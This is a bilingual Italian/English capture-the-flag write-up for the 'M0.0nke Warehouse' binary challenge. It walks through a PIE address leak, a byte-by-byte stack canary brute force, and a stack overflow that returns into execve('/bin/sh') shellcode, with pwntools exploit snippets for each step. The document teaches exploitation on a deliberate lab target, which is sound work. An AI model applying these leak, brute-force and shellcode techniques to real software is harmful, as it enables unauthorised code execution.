# M0.0nke Warehouse

## The program

The challenge simulates a "warehouse of secrets" managed by Jack the Monkey. There are 16 *vaults* (`warehouse[16]`), each represented by a struct:

</div>

```c
#pragma pack(1)
struct deposits {
    bool occupied;
    Deposits *Harambe;
    char owner[16];
    char secret[16];
};
Deposits Harambe;      // global, in .bss
Deposits more_space;   // global, in .bss
#pragma pack()
```

<div class="lang-it" markdown="1">
Il vault numero **15** è riservato a "Harambe's Soul" e punta a una struct globale `Harambe` in `.bss`. Il menu offre: prenotare un vault, aggiungere un segreto, leggere un segreto e "cambiare nome".

Le funzioni interessanti sono tre:

- `add_a_secret()` sul vault 15 permette, come "Super-Secret-M0nky-Vault", di fare `read(0, &Harambe, 48)` sulla struct globale, e poi di rendere quella pagina **`PROT_READ | PROT_EXEC`** tramite `da_magic()` (che è un wrapper attorno a `mprotect`).
- `handle_da_lier()` fa `calloc(1, 32)`, legge 32 byte con `read`, e poi controlla `strlen(new_name) > 16`. Se il nostro input inizia con un NULL byte, `strlen` è 0 e passiamo il controllo, ma `memcpy(warehouse[i].owner, new_name, len_readed)` copia comunque tutti i `len_readed` byte, sovrascrivendo il campo `owner` (e oltre) con dati controllati.
- `read_a_secret()` fa `printf("%s", warehouse[vault_num].secret)`: una `%s` che stampa fino al primo NULL, ottima primitiva di leak.

</div>

<div class="lang-en" markdown="1">
Vault number **15** is reserved for "Harambe's Soul" and points to a global `Harambe` struct in `.bss`. The menu offers: reserve a vault, add a secret, read a secret and "change name".

There are three interesting functions:

- `add_a_secret()` on vault 15, as the "Super-Secret-M0nky-Vault", does `read(0, &Harambe, 48)` on the global struct, and can then mark that page **`PROT_READ | PROT_EXEC`** via `da_magic()` (a wrapper around `mprotect`).
- `handle_da_lier()` does `calloc(1, 32)`, reads 32 bytes with `read`, then checks `strlen(new_name) > 16`. If our input starts with a NULL byte, `strlen` is 0 and we pass the check, yet `memcpy(warehouse[i].owner, new_name, len_readed)` still copies all `len_readed` bytes, overflowing the `owner` field (and beyond) with controlled data.
- `read_a_secret()` does `printf("%s", warehouse[vault_num].secret)`: a `%s` that prints up to the first NULL, a great leak primitive.

</div>

<div class="lang-it" markdown="1">
Tutte le mitigazioni attive. Servono quindi due leak (PIE e canary) prima di poter dirottare l'esecuzione.

## L'exploit

### Passo 1 — Leak di PIE

Sfruttiamo `handle_da_lier()`: mandando `b"\x00" + b"A"*31` passiamo il check su `strlen`, ma la `memcpy` scrive 32 byte a partire da `warehouse[i].owner`, "spingendo" oltre il campo `secret` e lasciando in memoria un puntatore (`Harambe` field, che è un puntatore alla `.bss`) non più terminato da NULL. Leggendo poi il segreto con l'opzione `3` (`printf("%s", ...)`) la stampa continua fino al puntatore e ce lo restituisce, dandoci un indirizzo assoluto e quindi la base dell'immagine.

</div>

<div class="lang-en" markdown="1">
All mitigations enabled. So we need two leaks (PIE and canary) before we can hijack execution.

## The exploit

### Step 1 — PIE leak

We abuse `handle_da_lier()`: sending `b"\x00" + b"A"*31` passes the `strlen` check, but the `memcpy` writes 32 bytes starting at `warehouse[i].owner`, spilling past the `secret` field and leaving a non-NULL-terminated pointer (the `Harambe` field, a pointer into `.bss`) in memory. Reading the secret with option `3` (`printf("%s", ...)`) then keeps printing until it hits the pointer and hands it to us — an absolute address, hence the image base.

</div>

```python
def leak_pie(p):
    p.recvuntil(b"to eat bananas.\n"); p.send(b"4")
    p.recvuntil(b"real name.\n")
    p.send(b"\x00" + b"A"*31)          # strlen == 0, ma memcpy copia tutto
    p.recvuntil(b"not a lier anymore.\n"); p.send(b"0")
    p.recvuntil(b"chance.\n"); p.send(b"A"*16)
    p.recvuntil(b"to eat bananas.\n"); p.sendline(b"3")
    p.recvuntil(b"you:\n"); p.recvuntil(b"A"*16 + b"\x01")
    pie_leak = u64(p.recv(6).lstrip(b"\x00").ljust(8, b"\x00"))
    return pie_leak
```

<div class="lang-it" markdown="1">
### Passo 2 — Leak del canary a forza bruta byte-per-byte

Il canary inizia sempre con un NULL byte, quindi ci restano 7 byte da recuperare. Usiamo la `memcmp(secret_buff, warehouse[15].secret, harambe_s_size)` presente nel ramo "1 - Vault": allineando il nostro buffer in modo che l'ultimo byte confrontato sia il primo byte incognito del canary, e provando tutti i 256 valori, il messaggio *"already in good hands"* (memcmp == 0) ci dice quando abbiamo indovinato. Si ripete per tutti gli 8 byte, allungando di 1 la size ad ogni giro.

</div>

<div class="lang-en" markdown="1">
### Step 2 — Byte-by-byte canary brute force

The canary always starts with a NULL byte, so 7 bytes remain to recover. We use the `memcmp(secret_buff, warehouse[15].secret, harambe_s_size)` in the "1 - Vault" branch: by aligning our buffer so the last compared byte is the first unknown canary byte, and trying all 256 values, the *"already in good hands"* message (memcmp == 0) tells us when we guessed right. Repeat for all 8 bytes, growing the size by 1 each round.

</div>

```python
payload = b"B"*30 + b"2\x00" + b"B"*23 + b"\x00"
for i in range(8):
    for j in range(256):
        # ... seleziona vault 15, ramo "1 - Vault", size = 56+i+1 ...
        p.send(payload + bytes([j]))
        if b"in good hands" in p.recvline():   # memcmp == 0 => byte giusto
            canary = bytes([j]) + canary
            payload += bytes([j])
            break
canary_full = u64(canary.ljust(8, b"\x00"), endianness="big")
```

<div class="lang-it" markdown="1">
### Passo 3 — Shellcode in pagina RWX + ritorno

Con l'opzione "2 - Super-Secret-M0nky-Vault" scriviamo la nostra shellcode `execve("/bin/sh")` direttamente nella struct globale `Harambe` (`read(0, &Harambe, 48)`) e poi scegliamo `1 - Praise the King Sun` per far chiamare a `da_magic()` un `mprotect(&Harambe, ..., PROT_READ | PROT_EXEC)`: la nostra shellcode è ora eseguibile a un indirizzo **noto** (il leak di PIE del passo 1 era proprio `&Harambe`).

Infine, il ramo "1 - Vault" con size massima (80) ci dà l'overflow dello stack: ricostruiamo lo stack frame mettendo il canary al posto giusto e come return address l'indirizzo di `Harambe`.

</div>

<div class="lang-en" markdown="1">
### Step 3 — Shellcode in an RWX page + return

With option "2 - Super-Secret-M0nky-Vault" we write our `execve("/bin/sh")` shellcode straight into the global `Harambe` struct (`read(0, &Harambe, 48)`) and then pick `1 - Praise the King Sun` so `da_magic()` calls `mprotect(&Harambe, ..., PROT_READ | PROT_EXEC)`: our shellcode is now executable at a **known** address (the PIE leak from step 1 was exactly `&Harambe`).

Finally, the "1 - Vault" branch with the maximum size (80) gives us the stack overflow: we rebuild the stack frame putting the canary in the right place and the address of `Harambe` as the return address.

</div>

```python
def we_see_the_sun(p, canary, ret_add):
    # vault 15, ramo "1 - Vault", size 80
    p.send(b"A"*56 + b"\x00" + p64(canary) + p64(canary) + p64(ret_add))
    p.recvuntil(b"Yes.\n"); p.send(b"1")
```
